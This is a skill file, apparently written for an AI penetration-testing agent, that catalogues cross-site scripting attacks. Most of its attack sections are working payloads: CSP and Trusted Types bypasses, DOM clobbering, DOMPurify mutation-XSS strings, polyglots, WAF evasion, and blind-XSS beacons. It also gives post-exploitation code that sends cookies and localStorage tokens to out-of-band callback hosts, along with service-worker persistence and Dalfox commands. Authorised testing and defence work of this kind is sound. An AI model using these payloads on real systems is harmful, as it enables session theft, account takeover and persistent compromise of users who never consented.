---
name: xss
description: XSS testing across reflected, stored, DOM-based, and blind vectors with CSP and Trusted Types bypass, DOM clobbering, mutation-XSS and DOMPurify sanitizer bypass, script gadgets, and framework-specific sinks (React/RSC, Vue, Angular, Svelte, Solid, Qwik, Astro)
---

# XSS

Cross-site scripting persists because context, parser, and framework edges are complex. Treat every user-influenced string as untrusted until it is strictly encoded for the exact sink and guarded by runtime policy (CSP/Trusted Types).

## Attack Surface

**Types**
- Reflected, stored, and DOM-based XSS across web/mobile/desktop shells

**Contexts**
- HTML, attribute, URL, JS, CSS, SVG/MathML, Markdown, PDF

**Frameworks**
- React/Vue/Angular/Svelte sinks, template engines, SSR/ISR

**Defenses to Bypass**
- CSP/Trusted Types, DOMPurify, framework auto-escaping

## Injection Points

**Server Render**
- Templates (Jinja/EJS/Handlebars), SSR frameworks, email/PDF renderers

**Client Render**
- `innerHTML`/`outerHTML`/`insertAdjacentHTML`, template literals
- `dangerouslySetInnerHTML`, `v-html`, `$sce.trustAsHtml`, Svelte `{@html}`

**URL/DOM**
- `location.hash`/`search`, `document.referrer`, base href, `data-*` attributes

**Events/Handlers**
- `onerror`/`onload`/`onfocus`/`onclick` and `javascript:` URL handlers

**Cross-Context**
- postMessage payloads, WebSocket messages, local/sessionStorage, IndexedDB

**File/Metadata**
- Image/SVG/XML names and EXIF, office documents processed server/client

## Context Encoding Rules

- **HTML text**: encode `< > & " '`
- **Attribute value**: encode `" ' < > &` and ensure attribute quoted; avoid unquoted attributes
- **URL/JS URL**: encode and validate scheme (allowlist https/mailto/tel); disallow javascript/data
- **JS string**: escape quotes, backslashes, newlines; prefer `JSON.stringify`
- **CSS**: avoid injecting into style; sanitize property names/values; beware `url()` and `expression()`
- **SVG/MathML**: treat as active content; many tags execute via onload or animation events

## Key Vulnerabilities

### DOM XSS

**Sources** (attacker-influenced values a page reads at runtime)
- `location.href`/`.search`/`.hash`/`.pathname`, `document.URL`/`documentURI`
- `document.referrer`, `document.cookie`, `window.name` (survives cross-origin navigation)
- `postMessage` event `data`, WebSocket/EventSource messages, service-worker messages
- `localStorage`/`sessionStorage`/IndexedDB reads, `history.state`
- server JSON reflected into inline `<script>`/`__NEXT_DATA__`-style hydration blobs

**Sinks** (grep for these on the source's data flow)
- HTML: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`/`writeln`, `Range.createContextualFragment`, `DOMParser.parseFromString`, `iframe.srcdoc`, `el.setHTML` (unsafe if no sanitizer arg)
- Attribute/URL: `setAttribute`, `el.src`/`href`/`action`/`formaction`/`data`, `location`/`.assign`/`.replace`, `window.open`
- Code eval: `eval`, `Function`, `setTimeout`/`setInterval`/`setImmediate` with a string, `new Worker(blobUrl)`, `execCommand('insertHTML')`
- jQuery (if present): `$(html)`, `.html()`, `.append`/`.prepend`/`.before`/`.after`/`.replaceWith`, `.globalEval`, `$.getScript`

**Vulnerable Pattern**
```javascript
const q = new URLSearchParams(location.search).get('q');
results.innerHTML = `<li>${q}</li>`;
```
Exploit: `?q=<img src=x onerror=fetch('//x.tld/'+document.domain)>`

### Mutation XSS

Leverage parser repairs to morph safe-looking markup into executable code (e.g., noscript, malformed tags):
```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>
<form><button formaction=javascript:alert(1)>
```

### Client-Side Template Injection

Client-side template engines that evaluate expressions in the DOM (AngularJS,
Vue in-DOM templates, Handlebars helpers, lodash templates) turn injected
`{{}}`/`${}` into script execution — CSP-resistant because no `<script>` is
needed (see Script Gadgets):
```
{{constructor.constructor('fetch(`//x.tld?c=`+document.cookie)')()}}
{{$eval.constructor('alert(1)')()}}            <!-- AngularJS >=1.6 (no sandbox) -->
{{_c.constructor('alert(1)')()}}               <!-- Vue 2 in-DOM template compile -->
```
For server-side template injection that reaches host-language RCE (Jinja,
Twig, Freemarker, ERB, ...), load `ssti` — that is a different impact class
(code execution on the server, not the browser) with its own probe catalog.

### CSP Bypass

- Weak policies: missing nonces/hashes, wildcards, `data:` `blob:` allowed, inline events allowed
- Script gadgets: JSONP endpoints, libraries exposing function constructors
- Import maps or modulepreload lax policies
- Base tag injection to retarget relative script URLs
- Dynamic module import with allowed origins

Read the delivered policy on the exact response first (it varies per route,
and error/API/static paths often differ):
```bash
curl -sI 'https://target/page' | grep -i content-security-policy
```

Concrete bypass classes, in rough order of frequency:

- **`'unsafe-inline'` still present** (no nonce/hash) → inject `<script>` or an inline event handler directly. A nonce/hash makes the browser *ignore* `'unsafe-inline'`, so the presence of `'unsafe-inline'` alongside a nonce is a config smell, not protection.
- **`'unsafe-eval'` present** → string sinks execute: `setTimeout('alert(1)')`, `Function('alert(1)')()`, `eval`, and many framework template compilers. You still need an injection into one of those sinks, but CSP no longer blocks it.
- **`'strict-dynamic'`** trusts any script created by an already-trusted script. Bypass by finding a **script gadget** (below) that a nonced/allowlisted script will use to inject your code, or by DOM-injecting a `<script>` that carries the page's own nonce when the nonce is predictable, reused across responses, or reflected somewhere you control.
- **Nonce leakage** → if the nonce appears in a reflectable location or you can read partial markup via dangling-markup injection, copy it into your own `<script nonce=...>`. Dangling-markup: `<img src='//evil?` swallows subsequent markup up to the next quote, exfiltrating the nonce to your server.
- **Missing `base-uri`** → `<base href="//evil.tld/">` retargets every relative `<script src>` to your origin (works even under a host-allowlist that assumed relative paths stay same-origin).
- **Missing `object-src 'none'`** → `<object data="data:text/html,<script>alert(1)</script>">` / `<embed>`.
- **Allowlisted CDN hosting a gadget** → `script-src *.googleapis.com` lets you load AngularJS from `ajax.googleapis.com` and run a CSTI payload; an allowlisted host exposing JSONP (`//allowed/api?callback=alert(1)//`) is direct execution. Enumerate every allowlisted host for JSONP endpoints and known-gadget libraries.
- **`data:`/`blob:` in `script-src`** → `<script src="data:text/javascript,alert(1)">`.
- **CSP injection** → if you control a reflected value that lands in the CSP header (header injection) or a `<meta http-equiv="Content-Security-Policy">` you can inject, add a weaker policy or a `script-src` host you control. Load `header_injection` for the response-splitting path.
- **`report-uri`/`report-to` exfiltration** → a violation report includes the blocked URI; craft violations whose blocked URL encodes secret data to leak it to your `report-uri` even when script is blocked.

Worked example — policy `Content-Security-Policy: script-src 'nonce-r4nd0m'
'strict-dynamic'; object-src 'none'; base-uri 'none'`: no inline, no eval, no
base injection. The realistic path is a **script gadget** — a nonced loader
that reads a `data-*`/DOM value and injects it, so your non-script HTML
injection becomes execution under `strict-dynamic`. If no gadget exists and
the nonce is unpredictable and unleakable, this is genuinely a False Positive
— record it as such.

### Trusted Types Bypass

- Custom policies returning unsanitized strings; abuse policy whitelists
- Sinks not covered by Trusted Types (CSS, URL handlers) and pivot via gadgets

TT is enforced by `Content-Security-Policy: require-trusted-types-for
'script'` (optionally with `trusted-types <names>` to allowlist policy
names). Concrete bypasses:

- **Lax default policy** — an app that registers `trustedTypes.createPolicy('default', {createHTML: s => s})` (identity, or a transform that still returns unsafe HTML) routes *every* unguarded `innerHTML`/`script.src` assignment through it, making it a universal bypass. Grep the bundle for `createPolicy('default'` and read what it returns.
- **Reusable named policy** — if `trusted-types foo` is allowed and a policy `foo` does an identity `createHTML`/`createScript`/`createScriptURL`, call it yourself:
  ```javascript
  trustedTypes.createPolicy('foo').createHTML('<img src=x onerror=alert(1)>')
  ```
  If `trusted-types` is absent (only `require-trusted-types-for`), you can create your own policy of any name and mint trusted values.
- **Unguarded sinks** — TT guards HTML/Script/ScriptURL sinks, not `location`/`javascript:` URLs, CSS, or (in some engines) `document.write`. Pivot to a `javascript:`-URL sink or a DOM-clobbering/prototype-pollution gadget that reaches a sink before the TT check.
- **`tt-policy-name` / report-only** — `Content-Security-Policy-Report-Only: require-trusted-types-for 'script'` logs violations but does not block; treat as no-TT for exploitation and note the report-only status.

## DOM Clobbering

Named HTML elements create properties on `document` and `window` and can
shadow globals. When an app reads a variable, config field, or even a DOM API
that an attacker can define via `id`/`name` markup, HTML injection with **no
script and no event handler** becomes code execution — this is the standard
way to bypass a sanitizer that strips scripts/handlers but allows `id`/`name`
(DOMPurify's default does).

Primitives:

```html
<!-- window.x / document.x become element references -->
<a id=x></a>                                   <!-- window.x = the <a> -->
<img name=y>                                    <!-- document.y = the <img> -->

<!-- nested property: clobber config.url that a loader reads -->
<a id=config><a id=config name=url href="https://evil.tld/x.js"></a>
<!-- config.url now stringifies to the href via HTMLCollection + named access -->

<!-- clobber a DOM API an app relies on -->
<img name=getElementById>                        <!-- document.getElementById now returns the img, not a function -->
<form id=x><input name=attributes></form>        <!-- x.attributes shadowed -->
```

Turn a clobbered node into a string the sink will use: `.toString()` of an
`<a>`/`<area>` returns its `href`; `.value` of an `<input>`; a two-element
`id` collection plus a `name` gives nested access (`x.y`). The classic chain:
sanitizer allows `id`/`name` → clobber `window.CONFIG.scriptSrc` (or a
markdown/loader's `defaultSrc`) → the app does `s.src = CONFIG.scriptSrc` →
your URL loads.

- Test whether the app reads any DOM-clobberable global: grep the bundle for
  `window.`/`document.` property reads that are not assigned first, and for
  `document.currentScript`, `.src`, `.getElementById` used without guards.
- Defenses to confirm before ruling out: `Object.freeze` on the config,
  explicit `typeof x === 'function'` guards, and DOMPurify's
  `SANITIZE_NAMED_PROPS: true` (off by default) which namespaces `id`/`name`.
- Load `browser_security` for the general gadget/coercion harness and
  `prototype_pollution` when the clobbered value flows through an object merge.

## Sanitizer Bypass (DOMPurify / mXSS)

Mutation XSS (mXSS) is the dominant sanitizer-bypass class: the sanitizer
parses the input, decides it is safe, serializes it, and the browser
**re-parses the serialized string differently**, resurrecting an executable
node. `innerHTML` get→set is not idempotent, so a value safe as a DOM tree
becomes unsafe after a round-trip.

DOMPurify is the reference target. Bypasses are **version-specific** — read
`DOMPurify.version` from the page and match a published bypass for that exact
build; do not assume a payload from one version works on another. The durable
technique classes:

- **Namespace confusion** — HTML integration points inside `<svg>`/`<math>`
  re-parse their contents as HTML on insertion, defeating checks made in the
  foreign namespace:
  ```html
  <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
  <svg></p><style><a id="</style><img src=x onerror=alert(1)>">
  ```
- **`<template>`/`<noscript>` re-parse** — content inert to the sanitizer's
  tree walk becomes live when inserted into a different context.
- **Attribute/comment breakouts** — `</style>`, `-->`, and `is=` custom-element
  tricks that split a token the sanitizer treated as inert.

Configuration bypasses (read the actual `DOMPurify.sanitize(..., {opts})`):

- `ADD_TAGS`/`ADD_ATTR` re-opening dangerous elements/attributes.
- `ALLOWED_URI_REGEXP` loosened to accept `data:`/`cid:`/`javascript:`.
- `WHOLE_DOCUMENT: true`, `RETURN_DOM*` variants, and `SAFE_FOR_TEMPLATES`
  off, each of which changes what is inspected vs inserted.

Other sanitizers with allowlist-config bypasses: `sanitize-html`, `js-xss`
(`xss` npm), `bleach` (Python), `sanitize`/`loofah` (Ruby). Validate by
round-tripping your candidate through the exact sanitizer + config and
checking whether the browser's re-parse produces an executing node.

## Script Gadgets

A script gadget is legitimate first- or third-party JS already on the page
that converts injected **non-script** markup (data attributes, HTML,
clobbered globals) into execution — the reason CSP and sanitizers so often
fail in practice, since the attacker never supplies a `<script>`.

- **Framework compilers** (when the library is present, even under CSP):
  ```html
  <div ng-app>{{$eval.constructor('alert(1)')()}}</div>   <!-- AngularJS -->
  <div id=app>{{_c.constructor('alert(1)')()}}</div>       <!-- Vue 2 in-DOM -->
  ```
- **Data-attribute gadgets** — Polymer/`data-bind` (Knockout), Aurelia,
  Ractive, AMP, `google-closure`; markup like `<div data-bind="html:...">`
  drives a sink the framework trusts.
- **JSONP on an allowlisted host** — `<script src="//allowed-cdn/api?callback=alert(1)//"></script>` executes under `script-src allowed-cdn`.
- **jQuery gadgets** — old `$(userHtml)` runs inline scripts; `$.globalEval`,
  `$.parseHTML` with untrusted input.

Enumerate every script and allowlisted origin for these; the presence of one
gadget collapses a `strict-dynamic` or nonce-based CSP. Load `browser_security`
for the general gadget-discovery method (coercion, `toString`/`valueOf`,
proxies) when no framework gadget is obvious.

## Polyglot Payloads

Classify the context, then pick the minimal breakout for it:

- **HTML node**: `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">`
- **Attr quoted**: `" autofocus onfocus=alert(1) x="`
- **Attr unquoted**: `onmouseover=alert(1)` (or `x=y onmouseover=...` to end the current attr)
- **Inside `<script>` block**: break the string, then break the tag if needed — `</script><svg onload=alert(1)>` beats string-escaping filters because the HTML parser closes the script first
- **JS string**: `"-alert(1)-"`, `'-alert(1)-'`, backtick context `${alert(1)}`; line-terminator breakout ` `/` `
- **JS template literal**: `${alert(1)}`
- **URL / `href`/`src`**: `javascript:alert(1)`, `data:text/html,<script>alert(1)</script>`, and whitespace-obfuscated `java\tscript:alert(1)`
- **CSS / `<style>`**: `</style><svg onload=alert(1)>`; `background:url("javascript:...")` in legacy engines only
- **SVG/MathML**: `<svg><animate onbegin=alert(1) attributeName=x dur=1s>`; `<math><maction actiontype=statusline#alert(1)>`
- **JSON reflected into HTML**: `</script><script>alert(1)</script>` when the JSON sits in an inline `<script>` block
- **Markdown**: `[x](javascript:alert(1))`, `![x](data:text/html,...)`, or raw HTML passthrough `<img src=x onerror=alert(1)>`

A compact context-agnostic polyglot for spraying when the context is unknown
(reflects and executes across HTML, attribute, script-string, and comment
contexts):
```
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```
Confirm the actual context from the reflection before relying on a polyglot —
a minimal context-correct payload is quieter in WAF logs and less likely to be
mangled.

## Filter & WAF Evasion

When a naive filter or WAF blocks the direct payload, vary the representation
the filter matched on while keeping what the browser parser accepts:

- **Case / whitespace**: `<ScRiPt>`, `<svg/onload=alert(1)>` (slash instead of space), `<svg%09onload=...>` (tab/newline/`\f` between attrs).
- **Event-handler breadth**: if `onload`/`onerror` are blocked, use the long tail — `onpointerenter`, `onpointerover`, `onanimationstart` (+ a CSS animation), `onanimationend`, `ontransitionend`, `onwheel`, `onfocusin`, `ontoggle` (`<details open ontoggle=alert(1)>`), `onbeforeinput`.
- **Tag breadth**: `<svg>`, `<math>`, `<video>`, `<audio>`, `<marquee>`, `<details>`, `<xss id=x tabindex=1 onfocus=alert(1)>` (custom element + autofocus/tab).
- **Encoding layers**: HTML entities in attribute values (`&#106;avascript:` for `javascript:` in an `href`), `&#x6a;`, decimal/hex/mixed, and double URL-encoding when a decoder runs twice before the sink. Match the encoding to what is decoded *before* the parser, not after.
- **JS-context escapes**: `alert(1)` (unicode escape of an identifier), `alert?.(1)`, `top['al'+'ert'](1)`, `window['ale'+'rt'](1)`, `Function('alert(1)')()`.
- **Attribute-value entities**: browsers decode HTML entities in attribute values, so `onerror=&#97;lert(1)` runs while a substring filter for `alert(` misses it.
- **Charset / sniffing**: if the response lacks `charset` and a payload can force interpretation (legacy UTF-7 `+ADw-script+AD4-`), or `X-Content-Type-Options: nosniff` is absent so a `text/plain`/`text/json` response is sniffed to HTML, that is a distinct execution path — flag the missing header.
- **Comment/parser repairs**: rely on the HTML parser fixing malformed markup (mutation XSS, above) rather than the exact string the filter expects.

Iterate one axis at a time and confirm against the real parser (browser /
`agent-browser`), not against the filter's regex — the goal is a payload the
filter does not match but the browser still executes.

## Framework-Specific

### React

- Primary sink: `dangerouslySetInnerHTML={{__html: user}}`.
- **`javascript:` URLs** in `href`/`src`/form `action`: React ≥16.9 warns but still renders them; older versions execute on click. `<a href={userUrl}>` with `userUrl="javascript:alert(1)"` is live unless the app validates the scheme.
- **Prop spreading** `<div {...userProps}>` — if `userProps` is attacker-influenced it can inject `dangerouslySetInnerHTML` or an `onClick`/`onError` handler.
- `ref` access to the raw DOM node then `node.innerHTML = user`.
- `ReactDOMServer.renderToString` output injected into a page without the React runtime re-escaping (SSR), or `dangerouslySetInnerHTML` on the server.
- Bypass patterns: unsanitized HTML through libraries; custom renderers using innerHTML.

### RSC (React Server Components) / Next.js App Router

- Server components serialize data into the RSC "flight" payload; the XSS risk lives at the **client-component boundary** — a `'use client'` component doing `dangerouslySetInnerHTML` on server-fetched-but-attacker-controlled data.
- `next/script` with `dangerouslySetInnerHTML` (inline scripts), and MDX/markdown rendered with raw-HTML passthrough.
- React's `experimental_taintUniqueValue`/`taintObjectReference` mark secrets, not HTML — they do not sanitize; do not treat their presence as XSS protection. Load `nextjs` for the App Router routing/caching surface.

### Vue

- Sinks: `v-html` and dynamic attribute bindings (`:href`/`:src` with `javascript:`).
- **In-DOM template compilation** (Vue 2, or Vue 3 with the full build mounting an existing element): user content in the mounted DOM is compiled as a template → CSTI (see Script Gadgets). Runtime-only builds are not affected.
- Dynamic `:is`/`component :is` and render functions building markup from input.
- SSR hydration mismatches can re-interpret content.

### Angular (2+ and legacy)

- **Modern Angular** sanitizes `[innerHTML]` by default; XSS comes from the trust-escape APIs misused on untrusted input — the full catalog:
  `bypassSecurityTrustHtml`, `bypassSecurityTrustScript`, `bypassSecurityTrustStyle`, `bypassSecurityTrustUrl`, `bypassSecurityTrustResourceUrl` (on `DomSanitizer`). Any of these fed attacker data is XSS; `TrustResourceUrl` on an `<iframe src>`/`<script src>` is the most severe.
- Template compilation of user-provided templates (`$compile` in AngularJS; dynamic component templates) → CSTI.
- **Legacy AngularJS**: expression sandbox escapes pre-1.6; the sandbox was removed in 1.6, so any `{{}}` interpolation of user input is direct execution.
- `$sce` trust APIs misused to whitelist attacker content.

### Svelte

- Sinks: `{@html user}` and dynamic attributes (`<a href={user}>` with `javascript:`).
- Svelte 5 runes do not change the `{@html}` sink — it remains unescaped by design.

### Solid / Qwik / Astro

- **Solid**: the `innerHTML` prop (`<div innerHTML={user}>`) is a raw sink; `<a href={user}>` javascript: URLs.
- **Qwik**: `dangerouslySetInnerHTML` prop.
- **Astro**: the `set:html` directive (`<div set:html={user}>`) injects raw HTML; Astro does not sanitize it.

### Markdown/Richtext

- Renderers often allow HTML passthrough; plugins may re-enable raw HTML
- Sanitize post-render; forbid inline HTML or restrict to safe whitelist

## Special Contexts

### Email

- Most clients strip scripts but allow CSS/remote content
- Use CSS/URL tricks only if relevant; avoid assuming JS execution

### PDF and Docs

- PDF engines may execute JS in annotations or links
- Test `javascript:` in links and submit actions

### File Uploads

- SVG/HTML uploads served with `text/html` or `image/svg+xml` can execute inline
- Verify content-type and `Content-Disposition: attachment`
- Mixed MIME and sniffing bypasses; ensure `X-Content-Type-Options: nosniff`

## Blind & Stored XSS

Stored payloads that fire in a context you cannot see — an admin dashboard, a
support-agent ticket view, a log/SIEM viewer, a server-side PDF/email render —
need an out-of-band callback to prove execution and reveal *where* it fired.

Mint a callback domain in the sandbox and beacon context on execution:

```bash
interactsh-client -v          # prints a unique *.oast.fun host + inbound hits
```
```html
<!-- exfiltrate the firing context: origin, cookies (if not HttpOnly), URL -->
<img src=x onerror="fetch('https://<id>.oast.fun/x?'+encodeURIComponent(location.href+'|'+document.cookie))">
<!-- script-src variant when inline is blocked but a host is allowlisted -->
<script src="https://<id>.oast.fun/p.js"></script>
```

High-yield placement for blind stored XSS (fields rendered in a *different*
principal's UI):

- profile/display-name, org/team name, support-ticket body and subject
- `User-Agent`, `Referer`, `X-Forwarded-For` logged into an internal log viewer
- uploaded filename shown in an admin file browser
- webhook/integration names, invoice/PO notes rendered in back-office tools

Validate by proving the payload executed in another user's or an internal
context — the callback's request metadata (internal source IP, an admin-only
path in `location`, a session cookie you never had) is the evidence. Model
behavior/response is not; a beacon that never arrives is not a finding.

## Post-Exploitation

- Session/token exfiltration: prefer fetch/XHR over image beacons for reliability
- Real-time control: WebSocket C2 with strict command set
- Persistence: service worker registration; localStorage/script gadget re-injection
- Impact: role hijack, CSRF chaining, internal port scan via fetch, credential phishing overlays

Exfiltration channels (pick one that survives the CSP `connect-src`/`img-src`):
```javascript
fetch('https://<id>.oast.fun/x',{method:'POST',body:document.cookie})   // needs connect-src
navigator.sendBeacon('https://<id>.oast.fun/x', localStorage.token)     // survives page unload
new Image().src='https://<id>.oast.fun/x?'+encodeURIComponent(document.cookie) // img-src
// CSS-only when script is blocked but style injection works: leak an attr char-by-char
// input[value^="a"]{background:url(https://<id>.oast.fun/a)} ... (attribute-value exfil)
```
When cookies are `HttpOnly` you cannot read them — do not stop. Ride the
existing session instead: `fetch(sameOriginStateChangeUrl, {credentials:
'include'})` to perform privileged actions, read a CSRF token from the DOM and
submit it, scrape `/api/me` and other authenticated endpoints, or register a
service worker for persistence. The impact is the account action performed,
not the cookie string.

## Testing Methodology

1. **Identify sources** - URL/query/hash/referrer, postMessage, storage, WebSocket, server JSON
2. **Trace to sinks** - Map data flow from source to sink
3. **Classify context** - HTML node, attribute, URL, script block, event handler, JS eval-like, CSS, SVG
4. **Assess defenses** - Output encoding, sanitizer, CSP, Trusted Types, DOMPurify config
5. **Craft payloads** - Minimal payloads per context with encoding/whitespace/casing variants
6. **Multi-channel** - Test across REST, GraphQL, WebSocket, SSE, service workers

## Validation

1. Provide minimal payload and context (sink type) with before/after DOM or network evidence
2. Demonstrate cross-browser execution where relevant or explain parser-specific behavior
3. Show bypass of stated defenses (sanitizer settings, CSP/Trusted Types) with proof
4. Quantify impact beyond alert: data accessed, action performed, persistence achieved

## False Positives

- Reflected content safely encoded in the exact context
- CSP with nonces/hashes and no inline/event handlers
- Trusted Types enforced on sinks; DOMPurify in strict mode with URI allowlists
- Scriptable contexts disabled (no HTML pass-through, safe URL schemes enforced)

## Impact

- Session hijacking and credential theft
- Account takeover via token exfiltration
- CSRF chaining for state-changing actions
- Malware distribution and phishing
- Persistent compromise via service workers

## Pro Tips

1. Start with context classification, not payload brute force
2. Use DOM instrumentation to log sink usage; it reveals unexpected flows
3. Keep a small, curated payload set per context and iterate with encodings
4. Validate defenses by configuration inspection and negative tests
5. Prefer impact-driven PoCs (exfiltration, CSRF chain) over alert boxes
6. Treat SVG/MathML as first-class active content; test separately
7. Re-run tests under different transports and render paths (SSR vs CSR vs hydration)
8. Test CSP/Trusted Types as features: attempt to violate policy and record the violation reports

## Tooling

- **Dalfox** — fast parameter/DOM XSS scanner with a blind mode; point it at a
  fuzzable position and give it your callback:
  ```bash
  dalfox url 'https://target/search?q=FUZZ' --blind https://<id>.oast.fun -o dalfox.txt
  dalfox url 'https://target/' --deep-domxss        # DOM source/sink walk
  ```
- **agent-browser** (sandbox) — instrument sinks and capture stored-XSS proof.
  Hook the setters in a controlled session, drive the page, then screenshot:
  ```bash
  cat <<'EOF' | agent-browser eval --stdin
  ['innerHTML','outerHTML'].forEach(p=>{const d=Object.getOwnPropertyDescriptor(Element.prototype,p);
    Object.defineProperty(Element.prototype,p,{set(v){console.log('SINK',p,v);return d.set.call(this,v)}})});
  const e=window.eval; window.eval=s=>{console.log('EVAL',s);return e(s)};
  EOF
  agent-browser screenshot          # then view_image the path for evidence
  ```
- **DOM Invader** (Burp, GUI) — DOM source→sink tracing, prototype-pollution and
  gadget scanning; the fastest way to find DOM-clobbering and PP-to-XSS gadgets
  when a browser GUI is available.
- **interactsh-client** — the OAST callback for blind/stored confirmation (above).

## Summary

Context + sink decide execution. Encode for the exact context, verify at runtime with CSP/Trusted Types, and validate every alternative render path. Small payloads with strong evidence beat payload catalogs.
